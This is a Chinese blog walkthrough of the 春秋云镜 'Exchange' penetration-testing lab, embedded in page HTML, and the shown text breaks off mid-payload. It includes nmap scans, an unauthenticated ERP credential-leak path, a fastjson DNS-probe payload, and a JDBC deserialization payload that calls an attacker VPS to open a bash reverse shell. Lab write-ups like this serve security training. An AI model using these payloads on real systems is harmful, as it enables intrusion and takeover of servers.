@@ -1,0 +1,490 @@
+<!DOCTYPE html><html lang="zn-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>春秋云镜-Exchange | </title><meta name="keywords" content="红队技能,内网渗透,春秋云镜"><meta name="author" content="xxshh"><meta name="copyright" content="xxshh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="春秋云镜-Exchange"><meta name="application-name" content="春秋云镜-Exchange"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="春秋云镜-Exchange"><meta property="og:url" content="http://example.com/2025/01/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/index.html"><meta property="og:site_name" content=""><meta property="og:description" content="0x00 IntroductionExchange 靶场涉及到内网渗透中的信息收集、代理转发、内网扫描、特权提升以及横向移动等技术方法，能够加强对域环境核心认证机制的理解。  0x01 信息收集nmap -sT --min-rate 10000 -p- 39.99.135.190    发现有四个开"><meta property="og:locale" content="zn-CN"><meta property="og:image" content="https://xxshh.github.io/images/%E7%BB%BF.jpg?_r_=9dd3ba88-10fa-2bd5-5013-3d6f99480167"><meta property="article:author" content="xxshh"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://xxshh.github.io/images/%E7%BB%BF.jpg?_r_=9dd3ba88-10fa-2bd5-5013-3d6f99480167"><meta name="description" content="0x00 IntroductionExchange 靶场涉及到内网渗透中的信息收集、代理转发、内网扫描、特权提升以及横向移动等技术方法，能够加强对域环境核心认证机制的理解。  0x01 信息收集nmap -sT --min-rate 10000 -p- 39.99.135.190    发现有四个开"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2025/01/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: undefined,
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: undefined,
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: false,
+  mainTone: undefined,
+  authorStatus: undefined,
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: xxshh","link":"链接: ","source":"来源: ","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: '',
+  title: '春秋云镜-Exchange',
+  postAI: '',
+  pageFillDescription: '0x00 Introduction, 0x01 信息收集, 0x02 Web渗透, 0x03 Fastjson 反序列化漏洞利用, 0x04 搭建代理, 0x05 内网扫描, 0x06 横向移动-Exchange邮件服务器, 0x07 横向移动-域控, 0x08 横向移动-个人电脑, 0x09 Conclusion靶场涉及到内网渗透中的信息收集代理转发内网扫描特权提升以及横向移动等技术方法能够加强对域环境核心认证机制的理解信息收集发现有四个开放的端口注意扫描最好扫两次比对结果是否相同我第一次扫描时就没扫出来端口接下来对这四个端口进行详细信息扫描浏览器访问显示禁止访问扫描端口的时候得到了一个访问之后是个登录页面接下来开始渗透渗透搜索关键词发现该系统存在未授权访问漏洞和远程命令执行漏洞华夏账号密码泄露后台最新组合漏洞中文网访问可以获取用户凭据密码应该是被加密了原来密码就是那么一开始尝试弱口令也能登录登录管理员账号后进入后台上述资料说后台存在反序列化漏洞到现在还没接触过搜一搜中各版本漏洞对抗史与总结先知社区反序列化漏洞原理与漏洞复现基于保姆级的详细教程漏洞原理博客反序列化漏洞利用是一个由阿里开发的开源解析库可以将对象转换为格式序列化也可以将字符串转换为对象反序列化漏洞原理反序列化漏洞是源于在处理数据时对输入的验证不足没有对字段进行过滤导致攻击者可以构造一个恶意的数据将恶意类作为的值当反序列化时从而实例化指定类导致远程代码执行该漏洞在后台用户管理的查询功能处触发首先抓个包验证是否存在反序列化漏洞将值改为编码后的接收到记录证明反序列化漏洞利用成功接下来构造利用链执行反弹反序列化之利用博客需要用到和是一个针对反序列化漏洞编写的恶意数据库依赖是一个反序列化利用神器放在同一个文件夹下编译文件执行以下命令开启一个地址编码后的反弹命令作用是向远程伪造的恶意服务发送请求服务端返回恶意结果触发反序列化将进行编码后发送成功执行反弹获取入口机的搭建代理工具建议仅在靶场使用在远程中启动脚本复制上方启动脚本的命令在入口机中执行代理信息在端在上编辑测试一下结果显示代理搭建成功内网扫描查看入口机地址进入目录使用扫描整个网段段存活数量为段存活数量为段存活数量为禁止访问访问被拒绝跳转已完成扫描结束耗时端口开放情况端口用于域控服务器的身份验证功能内网信息搜集结果域控邮件服务器个人电脑入口机横向移动邮件服务器是一个存在于的漏洞可以使攻击者绕过身份验证并模拟用户成功拿到权限用提供的命令测试一下成功添加个用户接下来使用自带的远程登录该用户由于靶机是系统选择协议获取邮件服务器的横向移动域控配置的共享本地文件内网渗透神器可以从进程中提取明文密码哈希值码和票据它还可以执行传递哈希值传递票据建立票据伪造域管理凭证令牌等诸多功能以管理员权限打开进入相应的目录下执行以下命令是一款以可视化图形分析域环境中的关系的工具渗透测试之内网攻防篇使用分析大型域内环境网络安全行业门户使用进行信息收集因为只有用户有域权限所以不能用新加的用户需要用的来执行命令把收集到的数据放到本地分析渗透测试之内网攻防篇使用分析大型域内环境网络安全行业门户发现上的域用户有权限是访问控制列表的一部分定义了哪些用户或组可以访问某个资源以及能执行哪些操作用户可以通过权限将自己添加为资源的完全控制者是用于处理网络协议的类的集合脚本利用指南上先知社区前面已经拿到了这个机器用户的所以可以先用中的进行利用冒充用户访问网络资源或系统无需知道密码本身获取权限的可交互上传为用户添加权限权限允许用户模拟域控请求帐户凭据这是一种高权限操作常见于密码提取攻击接着利用用户导出域内哈希域管哈希为用登录域控获取域控的横向移动个人电脑还有个没用到刚刚导出的域内哈希显示还有个用户是在域控上新增一个管理员用户登录域控输入在修改用户的密码登录的后发现桌面有一个不过需要解压密码内网中还存在服务访问使用用户的密码登录查看邮件放到中爆破手机号为解压拿到个人电脑的第一次接触内网渗透打靶过程非常吃力基本遇到的全是新知识继续加油吧',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-01-04 19:02:44',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="" type="application/atom+xml">
+</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://xxshh.github.io/images/Avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title"></div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/01/"><span class="card-archive-list-date">January 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/12/"><span class="card-archive-list-date">December 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">20</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">November 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">October 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/09/"><span class="card-archive-list-date">September 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">August 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>红队技能</span></a><a class="article-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>内网渗透</span></a><a class="article-meta__tags" href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>春秋云镜</span></a></span></div></div><h1 class="post-title" itemprop="name headline">春秋云镜-Exchange</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-01-02T07:29:55.000Z" title="发表于 2025-01-02 15:29:55">2025-01-02</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-01-04T11:02:44.477Z" title="更新于 2025-01-04 19:02:44">2025-01-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="春秋云镜-Exchange"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为北京"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>北京</span></div></div></div><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2025/01/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/"><header><a href="/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/" tabindex="-1" itemprop="url">红队技能</a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" tabindex="-1" itemprop="url">内网渗透</a><a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" tabindex="-1" itemprop="url">春秋云镜</a><h1 id="CrawlerTitle" itemprop="name headline">春秋云镜-Exchange</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">xxshh</span><time itemprop="dateCreated datePublished" datetime="2025-01-02T07:29:55.000Z" title="发表于 2025-01-02 15:29:55">2025-01-02</time><time itemprop="dateCreated datePublished" datetime="2025-01-04T11:02:44.477Z" title="更新于 2025-01-04 19:02:44">2025-01-04</time></header><h1 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00 Introduction"></a>0x00 Introduction</h1><p>Exchange 靶场涉及到内网渗透中的信息收集、代理转发、内网扫描、特权提升以及横向移动等技术方法，能够加强对域环境核心认证机制的理解。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250104190242.png"></p>
+<h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sT --min-rate <span class="hljs-number">10000</span> -p- <span class="hljs-number">39.99.135.190</span> <br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102153108.png"></p>
+<p>发现有四个开放的端口：21，22，80，8000。注意 nmap 扫描最好扫两次，比对结果是否相同。我第一次扫描时就没扫出来 8000 端口。</p>
+<p>接下来对这四个端口进行详细信息扫描：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sT -sC -sV -O -p21,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">8000</span> <span class="hljs-number">39.99.135.190</span><br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102153841.png"></p>
+<p>浏览器访问 <a target="_blank" rel="noopener" href="http://39.99.135.190/">http://39.99.135.190</a> ，显示禁止访问：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102154134.png"></p>
+<p>扫描 8000 端口的时候，得到了一个 url : <a target="_blank" rel="noopener" href="http://39.99.135.190:8000/login.html">http://39.99.135.190:8000/login.html</a> 。访问之后，是个登录页面：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102154335.png"></p>
+<p>接下来开始 Web 渗透。</p>
+<h1 id="0x02-Web渗透"><a href="#0x02-Web渗透" class="headerlink" title="0x02 Web渗透"></a>0x02 Web渗透</h1><p>搜索关键词：Lumia ERP v2.3 CVE ，发现该系统存在未授权访问漏洞和远程命令执行漏洞：</p>
+<p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/1798444.html">华夏erp账号密码泄露+后台rce（最新组合漏洞) | CN-SEC 中文网</a></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102160433.png"></p>
+<p>访问 <code>/user/getAllList;.ico</code> 可以获取用户凭据：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102161200.png"></p>
+<p>密码应该是被 MD5 加密了：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102161340.png"></p>
+<p>原来密码就是 123456，那么一开始尝试弱口令也能登录。</p>
+<p>登录管理员账号后进入后台：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102161515.png"></p>
+<p>上述资料说后台存在 fastjson 反序列化漏洞，到现在还没接触过，搜一搜：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14872?time__1311=GqA2Y50K4IxBqDwqeqBKKAIxQ=60xDOAeD#toc-0">Java中Fastjson各版本漏洞对抗史与总结 - 先知社区</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Bossfrank/article/details/130100893">Fastjson反序列化漏洞原理与漏洞复现（基于vulhub，保姆级的详细教程）_fastjson漏洞原理-CSDN博客</a></p>
+<h1 id="0x03-Fastjson-反序列化漏洞利用"><a href="#0x03-Fastjson-反序列化漏洞利用" class="headerlink" title="0x03 Fastjson 反序列化漏洞利用"></a>0x03 Fastjson 反序列化漏洞利用</h1><p>fastjson 是一个由阿里开发的开源 JSON 解析库，可以将 Java 对象转换为 JSON 格式(序列化)，也可以将 JSON 字符串转换为 Java 对象（反序列化）。</p>
+<p><strong>漏洞原理：</strong><br>Fastjson反序列化漏洞是源于在处理 json 数据时对输入的验证不足，没有对<code>@type</code>字段进行过滤，导致攻击者可以构造一个恶意的 JSON 数据，将恶意类作为 AutoType 的值。当 fastjson 反序列化时，从而实例化指定类导致远程代码执行。</p>
+<p>该漏洞在后台用户管理的查询功能处触发：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102180558.png"></p>
+<p>首先抓个包验证是否存在 fastjson 反序列化漏洞。</p>
+<p>payload：</p>
+<figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;b0ab221691.ipv6.1433.eu.org.&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>将 search 值改为 url 编码后的 payload：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102181757.png"></p>
+<p>接收到 DNS 记录，证明 fastjson 反序列化漏洞利用成功。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102181730.png"></p>
+<p>接下来构造 mysql-JDBC 利用链执行反弹 shell：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42077227/article/details/130236560">fastjson 反序列化之mysql JDBC 利用_fastjson mysql-CSDN博客</a></p>
+<p>需要用到 evil-mysql-server 和 ysoserial-all.jar 。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/dushixiang/evil-mysql-server">evil-mysql-server</a>是一个针对 jdbc 反序列化漏洞编写的恶意数据库，依赖 ysoserial。<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/releases">ysoserial-all.jar</a>是一个 java 反序列化利用神器。</p>
+<p>放在同一个文件夹下，编译 go 文件：</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> build evil-mysql-server.<span class="hljs-keyword">go</span><br></code></pre></td></tr></table></figure>
+
+<p>执行以下命令开启一个 fake mysql server：</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">./evil-mysql-<span class="hljs-keyword">server</span> -addr <span class="hljs-number">3307</span> -java java -ysoserial ysoserial-<span class="hljs-keyword">all</span>.jar<br></code></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">&#123;<br>	<span class="hljs-string">&quot;name&quot;</span>: &#123;<br>		<span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>		<span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>: <span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,<br>		<span class="hljs-string">&quot;hostToConnectTo&quot;</span>: <span class="hljs-string">&quot;vpsIP地址&quot;</span>,<br>		<span class="hljs-string">&quot;portToConnectTo&quot;</span>: <span class="hljs-number">3307</span>,<br>		<span class="hljs-string">&quot;info&quot;</span>: &#123;<br>			<span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;yso_CommonsCollections6_bash -c &#123;echo,base64编码后的反弹shell命令&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>,<br>			<span 